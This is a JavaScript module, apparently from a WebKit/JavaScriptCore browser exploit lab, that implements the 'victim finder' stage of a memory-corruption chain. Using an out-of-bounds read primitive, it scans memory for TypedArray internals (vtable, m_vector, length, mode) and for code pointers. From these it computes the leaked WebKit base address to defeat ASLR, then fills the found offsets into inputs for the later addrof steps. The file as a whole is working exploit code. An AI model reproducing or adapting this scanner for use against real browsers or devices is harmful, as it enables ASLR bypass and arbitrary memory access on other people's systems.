// js/victim_finder.mjs
import { AdvancedInt64, isAdvancedInt64Object } from './int64.mjs';
import { log as appLog, PAUSE_LAB, toHexS1 } from './utils.mjs';
import * as Core from './core_exploit.mjs';
import { JSC_OFFSETS, OOB_CONFIG, WEBKIT_LIBRARY_INFO, updateOOBConfigFromUI } from './config.mjs';

const FNAME_BASE = "VictimFinder";

const TYPED_ARRAY_MODES = {
    0x00: "Int8Array", 0x01: "Int16Array", 0x02: "Int32Array", 0x03: "Uint8Array",
    0x04: "Uint8ClampedArray", 0x05: "Uint16Array", 0x06: "Uint32Array",
    0x07: "Float32Array", 0x08: "Float64Array", 0x09: "DataView",
    // Adicione outros modos se aplicável ao seu alvo/versão do JSC
};

let leakedWebKitBaseAddress = null; // Será um objeto AdvancedInt64
let KNOWN_WEBKIT_VTABS_ABSOLUTE = []; // Array de { name: string, address: AdvancedInt64 }
let KNOWN_WEBKIT_STRINGS_ABSOLUTE = {}; // { "StringName": { offsetHex: "0x...", address: AdvancedInt64, value: "..." } }
let WEBKIT_SEGMENT_RANGES_ABSOLUTE = []; // { name, start (AdvInt64), end (AdvInt64), flags, description }

function initializeCachedWebKitData() {
    const FNAME_INIT_CACHE = `${FNAME_BASE}.initializeCachedWebKitData`;
    if (!leakedWebKitBaseAddress) {
        appLog("Base da WebKit não definida, não é possível inicializar dados cacheados da WebKit.", "warn", FNAME_INIT_CACHE);
        KNOWN_WEBKIT_VTABS_ABSOLUTE = [];
        KNOWN_WEBKIT_STRINGS_ABSOLUTE = {};
        WEBKIT_SEGMENT_RANGES_ABSOLUTE = [];
        return;
    }

    appLog("Recalculando dados cacheados da WebKit com base: " + leakedWebKitBaseAddress.toString(true), "info", FNAME_INIT_CACHE);

    // Calcular endereços absolutos de VTables conhecidas
    KNOWN_WEBKIT_VTABS_ABSOLUTE = [];
    if (WEBKIT_LIBRARY_INFO.KNOWN_OFFSETS && WEBKIT_LIBRARY_INFO.KNOWN_OFFSETS.VTable_Possible_Offsets) {
        WEBKIT_LIBRARY_INFO.KNOWN_OFFSETS.VTable_Possible_Offsets.forEach(vtableEntry => {
            try {
                let offsetHex, name;
                if (typeof vtableEntry === 'string') { // Formato antigo: apenas offset
                    offsetHex = vtableEntry;
                    name = `VTable@${offsetHex}`;
                } else if (typeof vtableEntry === 'object' && vtableEntry.offset && vtableEntry.name) { // Novo formato: { name, offset }
                    offsetHex = vtableEntry.offset;
                    name = vtableEntry.name;
                } else {
                    appLog(`Entrada de VTable inválida: ${JSON.stringify(vtableEntry)}. Esperado string ou {name, offset}.`, "warn", FNAME_INIT_CACHE);
                    return;
                }
                const vtableOffset = new AdvancedInt64(offsetHex);
                KNOWN_WEBKIT_VTABS_ABSOLUTE.push({ name: name, address: leakedWebKitBaseAddress.add(vtableOffset) });
            } catch (e) {
                appLog(`Erro ao processar VTable conhecida '${JSON.stringify(vtableEntry)}': ${e.message}`, "warn", FNAME_INIT_CACHE);
            }
        });
    }
    if (KNOWN_WEBKIT_VTABS_ABSOLUTE.length > 0) {
        appLog(`VTables absolutas conhecidas calculadas (${KNOWN_WEBKIT_VTABS_ABSOLUTE.length} entradas).`, "analysis", FNAME_INIT_CACHE);
    }

    // Calcular endereços absolutos de Strings conhecidas
    KNOWN_WEBKIT_STRINGS_ABSOLUTE = {};
    if (WEBKIT_LIBRARY_INFO.KNOWN_OFFSETS && WEBKIT_LIBRARY_INFO.KNOWN_OFFSETS.STRINGS) {
        for (const strName in WEBKIT_LIBRARY_INFO.KNOWN_OFFSETS.STRINGS) {
            try {
                const strOffsetHex = WEBKIT_LIBRARY_INFO.KNOWN_OFFSETS.STRINGS[strName];
                const strOffset = new AdvancedInt64(strOffsetHex);
                KNOWN_WEBKIT_STRINGS_ABSOLUTE[strName] = {
                    offsetHex: strOffsetHex,
                    address: leakedWebKitBaseAddress.add(strOffset),
                    // value: "..." // O valor real da string precisaria ser lido da memória ou definido na config
                };
            } catch (e) {
                appLog(`Erro ao processar String conhecida '${strName}': ${e.message}`, "warn", FNAME_INIT_CACHE);
            }
        }
         if (Object.keys(KNOWN_WEBKIT_STRINGS_ABSOLUTE).length > 0) {
            appLog(`Endereços de Strings conhecidas calculados (${Object.keys(KNOWN_WEBKIT_STRINGS_ABSOLUTE).length} entradas).`, "analysis", FNAME_INIT_CACHE);
        }
    }

    // Calcular ranges de segmentos absolutos
    WEBKIT_SEGMENT_RANGES_ABSOLUTE = WEBKIT_LIBRARY_INFO.SEGMENTS.map(seg => {
        const start = leakedWebKitBaseAddress.add(new AdvancedInt64(seg.vaddr_start_hex));
        const end = start.add(new AdvancedInt64(seg.memsz_hex)).sub(AdvancedInt64.One); // end é inclusivo
        return { name: seg.name, start: start, end: end, flags: seg.flags, description: seg.description };
    });
    if (WEBKIT_SEGMENT_RANGES_ABSOLUTE.length > 0) {
        appLog(`Segmentos da WebKit inicializados com base ${leakedWebKitBaseAddress.toString(true)}.`, "analysis", FNAME_INIT_CACHE);
    }
}

export function setLeakedWebKitBaseAddressFromUI() {
    const FNAME_SET_BASE_UI = `${FNAME_BASE}.setLeakedWebKitBaseAddressFromUI`;
    const leakedWebKitBaseHexEl = document.getElementById('leakedWebKitBaseHex');
    const baseAddrHex = leakedWebKitBaseHexEl ? leakedWebKitBaseHexEl.value.trim() : "";

    if (!baseAddrHex) {
        leakedWebKitBaseAddress = null;
        appLog(`Endereço base da WebKit LIMPO via UI.`, "info", FNAME_SET_BASE_UI);
    } else {
        try {
            leakedWebKitBaseAddress = new AdvancedInt64(baseAddrHex);
            appLog(`Endereço base da WebKit DEFINIDO via UI para: ${leakedWebKitBaseAddress.toString(true)}`, "leak", FNAME_SET_BASE_UI);
        } catch (e) {
            leakedWebKitBaseAddress = null;
            appLog(`ERRO ao definir endereço base da WebKit com '${baseAddrHex}' da UI: ${e.message}`, "error", FNAME_SET_BASE_UI);
            if (leakedWebKitBaseHexEl) leakedWebKitBaseHexEl.value = ""; // Limpa input inválido
        }
    }
    initializeCachedWebKitData(); // Recalcula todos os dados dependentes do base
}

function getSegmentForAddress(absoluteAddress) {
    if (!isAdvancedInt64Object(absoluteAddress) || WEBKIT_SEGMENT_RANGES_ABSOLUTE.length === 0) return null;
    for (const seg of WEBKIT_SEGMENT_RANGES_ABSOLUTE) {
        if (absoluteAddress.greaterThanOrEqual(seg.start) && absoluteAddress.lessThanOrEqual(seg.end)) {
            return seg;
        }
    }
    return null;
}

function isLengthPlausible(lengthVal) {
    if (typeof lengthVal !== 'number' || isNaN(lengthVal)) return false;
    // Um TypedArray geralmente não terá um length negativo ou excessivamente grande.
    // Ajuste esses limites conforme necessário para o seu alvo. Max 256M elementos.
    return lengthVal >= 0 && lengthVal <= 0x10000000;
}

function isVectorPlausible(vectorPtr, segmentRanges) {
    if (!isAdvancedInt64Object(vectorPtr) || vectorPtr.isNullPtr()) return false;
    // Um ponteiro de vetor válido geralmente aponta para a heap, que não é coberta pelos segmentos
    // da biblioteca WebKit. No entanto, para testes, um ponteiro > 0x10000 é uma heurística básica.
    // Em um sistema real, você verificaria se está em uma região de heap conhecida.
    const basicPlausible = vectorPtr.greaterThanOrEqual(new AdvancedInt64("0x10000"));
    if (!basicPlausible) return false;

    // Adicionalmente, verificar se NÃO está dentro dos segmentos da lib WebKit (a menos que seja intencional)
    if (segmentRanges && segmentRanges.length > 0) {
        for (const seg of segmentRanges) {
            if (vectorPtr.greaterThanOrEqual(seg.start) && vectorPtr.lessThanOrEqual(seg.end)) {
                appLog(`   AVISO: m_vector ${vectorPtr.toString(true)} aponta para dentro do segmento '${seg.name}' da WebKit.`, "warn", `${FNAME_BASE}.isVectorPlausible`);
                // Isso pode ser válido em alguns cenários de exploit, mas geralmente é suspeito para um buffer de dados.
            }
        }
    }
    return true;
}

async function scanForTypedArrays(gapOrRelativeOffset, readFn) {
    const FNAME_SCAN_TA = `${FNAME_BASE}.scanForTypedArrays`;
    let candidate = { type: "TypedArrayCandidate", gapOrRelativeOffset, details: {}, errors: [] };

    try {
        // 1. Ler VTable (ou StructureID)
        const vtablePtrVal = readFn(gapOrRelativeOffset + JSC_OFFSETS.TypedArray.VTABLE_OFFSET, 8);
        if (!isAdvancedInt64Object(vtablePtrVal)) {
            candidate.errors.push("Falha ao ler VTable (tipo inválido)."); return candidate;
        }
        candidate.details.vtable_ptr_hex = vtablePtrVal.toString(true);
        appLog(`  TA Scan @ ${toHexS1(gapOrRelativeOffset)}: VTable Ptr = ${candidate.details.vtable_ptr_hex}`, "ptr", FNAME_SCAN_TA);

        candidate.details.vtable_match_info = "Nenhuma base WebKit para verificar VTable.";
        if (leakedWebKitBaseAddress) {
            candidate.details.vtable_match_info = "Nenhuma VTable conhecida corresponde.";
            for (const knownVTab of KNOWN_WEBKIT_VTABS_ABSOLUTE) {
                if (vtablePtrVal.equals(knownVTab.address)) {
                    candidate.details.vtable_match_info = `MATCH! Nome: ${knownVTab.name} (Offset Lib: ${knownVTab.address.sub(leakedWebKitBaseAddress).toString(true)})`;
                    appLog(`    MATCH DE VTABLE! ${candidate.details.vtable_match_info}`, "vuln", FNAME_SCAN_TA);
                    break;
                }
            }
            if (!candidate.details.vtable_match_info.startsWith("MATCH!")) {
                 const segment = getSegmentForAddress(vtablePtrVal);
                 if (segment) {
                     candidate.details.vtable_match_info += ` (Aponta para segmento ${segment.name} @ offset rel ${vtablePtrVal.sub(leakedWebKitBaseAddress).toString(true)})`;
                 } else {
                     candidate.details.vtable_match_info += ` (Não aponta para segmento conhecido da WebKit)`;
                 }
            }
        }

        // 2. Ler m_vector
        const mVectorVal = readFn(gapOrRelativeOffset + JSC_OFFSETS.TypedArray.M_VECTOR_OFFSET, 8);
        if (!isAdvancedInt64Object(mVectorVal)) {
            candidate.errors.push("Falha ao ler m_vector (tipo inválido)."); return candidate;
        }
        candidate.details.m_vector_hex = mVectorVal.toString(true);
        appLog(`  TA Scan @ ${toHexS1(gapOrRelativeOffset)}: m_vector = ${candidate.details.m_vector_hex}`, "ptr", FNAME_SCAN_TA);

        // 3. Ler m_length
        const mLengthVal = readFn(gapOrRelativeOffset + JSC_OFFSETS.TypedArray.M_LENGTH_OFFSET, 4);
        candidate.details.m_length = mLengthVal; // Mantém como número
        appLog(`  TA Scan @ ${toHexS1(gapOrRelativeOffset)}: m_length = ${mLengthVal} (${toHexS1(mLengthVal)})`, "info", FNAME_SCAN_TA);

        // 4. Ler m_mode
        const mModeVal = readFn(gapOrRelativeOffset + JSC_OFFSETS.TypedArray.M_MODE_OFFSET, 4);
        candidate.details.m_mode = mModeVal;
        candidate.details.m_mode_type = TYPED_ARRAY_MODES[mModeVal] || "Desconhecido/Inválido";
        appLog(`  TA Scan @ ${toHexS1(gapOrRelativeOffset)}: m_mode = ${toHexS1(mModeVal)} (Tipo: ${candidate.details.m_mode_type})`, "info", FNAME_SCAN_TA);

        // 5. Ler ponteiro do ArrayBuffer associado
        const mBufferPtrVal = readFn(gapOrRelativeOffset + JSC_OFFSETS.TypedArray.ASSOCIATED_ARRAYBUFFER_OFFSET, 8);
         if (!isAdvancedInt64Object(mBufferPtrVal)) {
            candidate.errors.push("Falha ao ler ponteiro do ArrayBuffer (tipo inválido)."); return candidate;
        }
        candidate.details.m_buffer_ptr_hex = mBufferPtrVal.toString(true);
        appLog(`  TA Scan @ ${toHexS1(gapOrRelativeOffset)}: m_buffer_ptr = ${candidate.details.m_buffer_ptr_hex}`, "ptr", FNAME_SCAN_TA);


        // Heurísticas de validação final
        candidate.is_plausible = isLengthPlausible(mLengthVal) &&
                                 isVectorPlausible(mVectorVal, WEBKIT_SEGMENT_RANGES_ABSOLUTE) &&
                                 !mBufferPtrVal.isNullPtr() && // AB associado não deve ser nulo para TA válido
                                 (candidate.details.vtable_match_info.startsWith("MATCH!") || (leakedWebKitBaseAddress && getSegmentForAddress(vtablePtrVal) !== null)); // Mais forte se VTable bate ou está na lib

        if (candidate.is_plausible) {
            appLog(`  CANDIDATO TypedArray PLAUSÍVEL encontrado em GAP ${toHexS1(gapOrRelativeOffset)}! Tipo: ${candidate.details.m_mode_type}, Length: ${candidate.details.m_length}`, "vuln", FNAME_SCAN_TA);
        } else {
             appLog(`  Candidato TypedArray em GAP ${toHexS1(gapOrRelativeOffset)} NÃO PARECE PLAUSÍVEL.`, "warn", FNAME_SCAN_TA);
        }

    } catch (e) {
        candidate.errors.push(`Exceção durante varredura TA: ${e.message}`);
        appLog(`Exceção em scanForTypedArrays para GAP ${toHexS1(gapOrRelativeOffset)}: ${e.message}`, "error", FNAME_SCAN_TA);
    }
    return candidate;
}

async function scanForCodePointers(gapOrRelativeOffset, readFn) {
    const FNAME_SCAN_CP = `${FNAME_BASE}.scanForCodePointers`;
    let candidate = { type: "CodePointerCandidate", gapOrRelativeOffset, details: {}, errors: [] };

    try {
        const potentialPtr = readFn(gapOrRelativeOffset, 8);
        if (!isAdvancedInt64Object(potentialPtr) || potentialPtr.isNullPtr()) {
             candidate.errors.push("Ponteiro inválido ou nulo."); return candidate;
        }
        candidate.details.pointer_hex = potentialPtr.toString(true);
        appLog(`  CP Scan @ ${toHexS1(gapOrRelativeOffset)}: Potential Ptr = ${candidate.details.pointer_hex}`, "ptr", FNAME_SCAN_CP);

        candidate.is_plausible = false;
        if (leakedWebKitBaseAddress) {
            const segment = getSegmentForAddress(potentialPtr);
            if (segment) {
                candidate.details.segment_info = `Aponta para ${segment.name} (Offset Lib: ${potentialPtr.sub(leakedWebKitBaseAddress).toString(true)})`;
                appLog(`    ${candidate.details.segment_info}`, "analysis", FNAME_SCAN_CP);
                if (segment.flags.includes("x")) { // Se está em um segmento executável
                    candidate.is_plausible = true;
                    appLog(`    CANDIDATO CodePointer PLAUSÍVEL (em segmento executável)!`, "leak", FNAME_SCAN_CP);
                }

                // Tentar casar com FUNCTION_OFFSETS conhecidos
                for (const funcName in WEBKIT_LIBRARY_INFO.FUNCTION_OFFSETS) {
                    try {
                        const funcOffset = new AdvancedInt64(WEBKIT_LIBRARY_INFO.FUNCTION_OFFSETS[funcName]);
                        if (potentialPtr.sub(leakedWebKitBaseAddress).equals(funcOffset)) {
                            candidate.details.function_match = funcName;
                            appLog(`    MATCH DE FUNÇÃO! Ponteiro corresponde a '${funcName}' (Offset Lib: ${funcOffset.toString(true)})`, "vuln", FNAME_SCAN_CP);
                            candidate.is_plausible = true; // Confirma plausibilidade
                            break;
                        }
                    } catch (e) { /* ignora erro de parse no offset da função */ }
                }


            } else {
                 candidate.details.segment_info = "Não aponta para segmento conhecido da WebKit.";
            }
        } else {
            // Sem base, tentar calcular base a partir de FUNCTION_OFFSETS
            for (const funcName in WEBKIT_LIBRARY_INFO.FUNCTION_OFFSETS) {
                try {
                    const funcOffsetInt64 = new AdvancedInt64(WEBKIT_LIBRARY_INFO.FUNCTION_OFFSETS[funcName]);
                    const potentialBaseAddr = potentialPtr.sub(funcOffsetInt64);

                    // Heurística para um endereço base: alinhado à página (ex: últimos 3 nibbles são 0) e em um range esperado
                    // (ex: > 0x100000000 para 64-bit, ajuste conforme o alvo)
                    if ((potentialBaseAddr.low() & 0xFFF) === 0 && potentialBaseAddr.greaterThanOrEqual(new AdvancedInt64("0x100000000"))) {
                        candidate.details.calculated_base_hex = potentialBaseAddr.toString(true);
                        candidate.details.calculated_base_from_func = funcName;
                        candidate.details.segment_info = `Potencial base ${candidate.details.calculated_base_hex} calculado de '${funcName}'`;
                        appLog(`    Potencial base ${candidate.details.calculated_base_hex} calculado a partir de '${funcName}' (Offset Lib: ${funcOffsetInt64.toString(true)})`, "leak", FNAME_SCAN_CP);
                        candidate.is_plausible = true;
                        break; // Encontrou um cálculo de base plausível
                    }
                } catch (e) { /* ignora erro de parse no offset da função */ }
            }
             if (!candidate.is_plausible) {
                candidate.details.segment_info = "Nenhuma base WebKit para análise de segmento, e nenhum cálculo de base a partir de funções conhecidas foi bem-sucedido.";
            }
        }

    } catch (e) {
        candidate.errors.push(`Exceção durante varredura CP: ${e.message}`);
        appLog(`Exceção em scanForCodePointers para GAP ${toHexS1(gapOrRelativeOffset)}: ${e.message}`, "error", FNAME_SCAN_CP);
    }
    return candidate;
}

async function scanForKnownStrings(gapOrRelativeOffset, readFn) {
    const FNAME_SCAN_STR = `${FNAME_BASE}.scanForKnownStrings`;
    let candidate = { type: "KnownStringCandidate", gapOrRelativeOffset, details: {}, errors: [] };

    if (!leakedWebKitBaseAddress || Object.keys(KNOWN_WEBKIT_STRINGS_ABSOLUTE).length === 0) {
        candidate.errors.push("Base da WebKit ou strings conhecidas não configuradas.");
        return candidate;
    }
    try {
        const potentialPtrToString = readFn(gapOrRelativeOffset, 8);
        if (!isAdvancedInt64Object(potentialPtrToString) || potentialPtrToString.isNullPtr()) {
            candidate.errors.push("Ponteiro inválido ou nulo."); return candidate;
        }
        candidate.details.pointer_to_string_hex = potentialPtrToString.toString(true);

        for (const strName in KNOWN_WEBKIT_STRINGS_ABSOLUTE) {
            const knownStrInfo = KNOWN_WEBKIT_STRINGS_ABSOLUTE[strName];
            if (potentialPtrToString.equals(knownStrInfo.address)) {
                candidate.details.string_match_name = strName;
                candidate.details.string_offset_in_lib_hex = knownStrInfo.offsetHex;
                // Para ler o valor da string, precisaríamos de uma primitiva de leitura absoluta
                // ou que o ponteiro esteja dentro da nossa janela OOB.
                // Por agora, apenas o match do ponteiro.
                appLog(`  STR Scan @ ${toHexS1(gapOrRelativeOffset)}: Ponteiro ${potentialPtrToString.toString(true)} MATCHES string conhecida '${strName}' (Offset Lib: ${knownStrInfo.offsetHex})`, "vuln", FNAME_SCAN_STR);
                candidate.is_plausible = true;
                return candidate; // Encontrou um match
            }
        }
         appLog(`  STR Scan @ ${toHexS1(gapOrRelativeOffset)}: Ponteiro ${potentialPtrToString.toString(true)} não corresponde a nenhuma string conhecida.`, "info", FNAME_SCAN_STR);


    } catch (e) {
        candidate.errors.push(`Exceção durante varredura de String: ${e.message}`);
        appLog(`Exceção em scanForKnownStrings para GAP ${toHexS1(gapOrRelativeOffset)}: ${e.message}`, "error", FNAME_SCAN_STR);
    }
    return candidate;
}


export async function scanMemory(startOffset, range, step, readFn = Core.oob_read_relative) {
    const FNAME_SCAN_MEM = `${FNAME_BASE}.scanMemory`;
    appLog(`--- Iniciando Varredura de Memória ---`, "test", FNAME_SCAN_MEM);
    appLog(`Range: ${toHexS1(startOffset)} a ${toHexS1(startOffset + range -1)}, Passo: ${step}`, "info", FNAME_SCAN_MEM);
    if (leakedWebKitBaseAddress) {
        appLog(`Usando Base WebKit Vazado: ${leakedWebKitBaseAddress.toString(true)}`, "leak", FNAME_SCAN_MEM);
    } else {
        appLog("AVISO: Nenhuma Base WebKit Vazado fornecida. A precisão da varredura será limitada.", "warn", FNAME_SCAN_MEM);
    }

    let all_candidates = [];
    const endOffset = startOffset + range;

    for (let currentCandidateBaseRelOffset = startOffset; currentCandidateBaseRelOffset < endOffset; currentCandidateBaseRelOffset += step) {
        appLog(`--- Varrendo em GAP/Offset Relativo: ${toHexS1(currentCandidateBaseRelOffset)} (${currentCandidateBaseRelOffset}) ---`, "subtest", FNAME_SCAN_MEM);

        // Tenta identificar TypedArray
        const taCandidate = await scanForTypedArrays(currentCandidateBaseRelOffset, readFn);
        if (taCandidate && taCandidate.is_plausible) {
            all_candidates.push(taCandidate);
        } else if (taCandidate && taCandidate.errors && taCandidate.errors.length > 0) {
             appLog(`  Erros ao escanear TypedArray em ${toHexS1(currentCandidateBaseRelOffset)}: ${taCandidate.errors.join(", ")}`, "warn", FNAME_SCAN_MEM);
        }


        // Tenta identificar Ponteiros de Código
        const cpCandidate = await scanForCodePointers(currentCandidateBaseRelOffset, readFn);
        if (cpCandidate && cpCandidate.is_plausible) {
            all_candidates.push(cpCandidate);
        } else if (cpCandidate && cpCandidate.errors && cpCandidate.errors.length > 0) {
            appLog(`  Erros ao escanear CodePointer em ${toHexS1(currentCandidateBaseRelOffset)}: ${cpCandidate.errors.join(", ")}`, "warn", FNAME_SCAN_MEM);
        }


        // Tenta identificar Ponteiros para Strings Conhecidas (se base estiver definida)
        if (leakedWebKitBaseAddress && Object.keys(KNOWN_WEBKIT_STRINGS_ABSOLUTE).length > 0) {
            const strCandidate = await scanForKnownStrings(currentCandidateBaseRelOffset, readFn);
            if (strCandidate && strCandidate.is_plausible) {
                all_candidates.push(strCandidate);
            } else if (strCandidate && strCandidate.errors && strCandidate.errors.length > 0) {
                appLog(`  Erros ao escanear String Conhecida em ${toHexS1(currentCandidateBaseRelOffset)}: ${strCandidate.errors.join(", ")}`, "warn", FNAME_SCAN_MEM);
            }
        }


        if (currentCandidateBaseRelOffset % (step * 20) === 0) { // Pausa a cada 20 steps para UI responsiva
            await PAUSE_LAB(10);
             // Verifica se a página ainda está visível para evitar trabalho em background desnecessário
            if (document.hidden) {
                appLog("Varredura de memória pausada pois a página ficou oculta.", "warn", FNAME_SCAN_MEM);
                return {aborted: true, candidates: all_candidates};
            }
        }
    }
    appLog(`--- Varredura de Memória Concluída ---`, "test", FNAME_SCAN_MEM);
    return {aborted: false, candidates: all_candidates};
}


export async function findVictimButtonHandler() {
    const FNAME_HANDLER = `${FNAME_BASE}.findVictimButtonHandler`;
    appLog(`--- ${FNAME_HANDLER} ---`, 'test', FNAME_HANDLER);

    if (!Core.oob_dataview_real) {
        appLog("ERRO CRÍTICO: Primitiva OOB não está configurada (Passo 0). Varredura abortada.", "error", FNAME_HANDLER);
        return;
    }
    updateOOBConfigFromUI(); // Garante que OOB_CONFIG está atualizado

    const startOffsetEl = document.getElementById('victimFinderScanStartOffset');
    const rangeEl = document.getElementById('victimFinderScanRange');
    const stepEl = document.getElementById('victimFinderScanStep');

    let startOffset = 0;
    let range = 2048;
    let step = 8;

    if (startOffsetEl && startOffsetEl.value.trim() !== "") {
        const valStr = startOffsetEl.value.trim();
        startOffset = valStr.toLowerCase().startsWith("0x") ? parseInt(valStr, 16) : parseInt(valStr, 10);
        if (isNaN(startOffset)) { appLog("Offset inicial inválido, usando 0.", "warn", FNAME_HANDLER); startOffset = 0; }
    }
    if (rangeEl && rangeEl.value.trim() !== "") {
        const val = parseInt(rangeEl.value, 10);
        if (!isNaN(val) && val > 0) range = val; else { appLog("Range inválido, usando 2048.", "warn", FNAME_HANDLER); range = 2048; }
    }
    if (stepEl && stepEl.value.trim() !== "") {
        const val = parseInt(stepEl.value, 10);
        if (!isNaN(val) && val > 0) step = val; else { appLog("Passo inválido, usando 8.", "warn", FNAME_HANDLER); step = 8; }
    }

    const result = await scanMemory(startOffset, range, step);
    const candidates = result.candidates;

    if (result.aborted) {
        appLog("Processo de busca de vítima foi abortado (página oculta).", "warn", FNAME_HANDLER);
        return;
    }

    if (candidates && candidates.length > 0) {
        appLog(`ScanMemory retornou ${candidates.length} candidatos totais:`, "good", FNAME_HANDLER);
        let firstTypedArrayCandidate = null;

        candidates.forEach(c => {
            if (c.type === "TypedArrayCandidate" && c.is_plausible) {
                if (!firstTypedArrayCandidate) firstTypedArrayCandidate = c;
                appLog(`  - TypedArray Plausível @ GAP ${toHexS1(c.gapOrRelativeOffset)}: Tipo=${c.details.m_mode_type}, Len=${c.details.m_length}, VTableMatch='${c.details.vtable_match_info}', Vector=${c.details.m_vector_hex}`, "vuln", FNAME_HANDLER);
            } else if (c.type === "CodePointerCandidate" && c.is_plausible) {
                const baseInfo = c.details.calculated_base_hex ? ` (Base Calc: ${c.details.calculated_base_hex} de ${c.details.calculated_base_from_func})` : '';
                const funcMatchInfo = c.details.function_match ? ` (MATCHED FUNC: ${c.details.function_match})` : '';
                appLog(`  - CodePointer Plausível @ GAP ${toHexS1(c.gapOrRelativeOffset)}: Ptr=${c.details.pointer_hex}, Segment='${c.details.segment_info}'${baseInfo}${funcMatchInfo}`, "leak", FNAME_HANDLER);
                // Auto-preencher e aplicar base se um for calculado e nenhum já estiver definido
                if (c.details.calculated_base_hex && !leakedWebKitBaseAddress) {
                    const leakedWebKitBaseHexEl = document.getElementById('leakedWebKitBaseHex');
                    if (leakedWebKitBaseHexEl) leakedWebKitBaseHexEl.value = c.details.calculated_base_hex;
                    setLeakedWebKitBaseAddressFromUI(); // Usa a função que também atualiza os caches
                }
            } else if (c.type === "KnownStringCandidate" && c.is_plausible) {
                 appLog(`  - String Conhecida Plausível @ GAP ${toHexS1(c.gapOrRelativeOffset)}: PtrToString=${c.details.pointer_to_string_hex}, StringName='${c.details.string_match_name}', OffsetLib=${c.details.string_offset_in_lib_hex}`, "leak", FNAME_HANDLER);
            } else {
                // Log menos verboso para não plausíveis, ou apenas os erros se houver
                if (c.errors && c.errors.length > 0) {
                     appLog(`  - Candidato (${c.type}) em GAP ${toHexS1(c.gapOrRelativeOffset)} com erros: ${c.errors.join('; ')}. Detalhes: ${JSON.stringify(c.details)}`, "warn", FNAME_HANDLER);
                }
            }
        });

        const gapInputEl = document.getElementById('gap_to_test_input');
        const addrofGapEl = document.getElementById('addrofGap');
        if (firstTypedArrayCandidate) {
            const firstCandidateGap = firstTypedArrayCandidate.gapOrRelativeOffset;
            if (gapInputEl) {
                gapInputEl.value = firstCandidateGap; // Popula como número decimal
                appLog(`   GAP/Offset do primeiro TypedArray (${toHexS1(firstCandidateGap)}) populado no input 'gap_to_test_input' como ${firstCandidateGap}.`, "info", FNAME_HANDLER);
            }
            if (addrofGapEl) {
                addrofGapEl.value = firstCandidateGap; // Popula como número decimal
                 appLog(`   GAP/Offset do primeiro TypedArray (${toHexS1(firstCandidateGap)}) populado no input 'addrofGap' como ${firstCandidateGap}.`, "info", FNAME_HANDLER);
            }
        }
    } else {
        appLog("Nenhum candidato encontrado na varredura com os critérios atuais.", "warn", FNAME_HANDLER);
    }
    appLog(`--- ${FNAME_HANDLER} Concluído ---`, 'test', FNAME_HANDLER);
}

export function getLeakedWebKitBaseAddress() {
    return leakedWebKitBaseAddress;
}
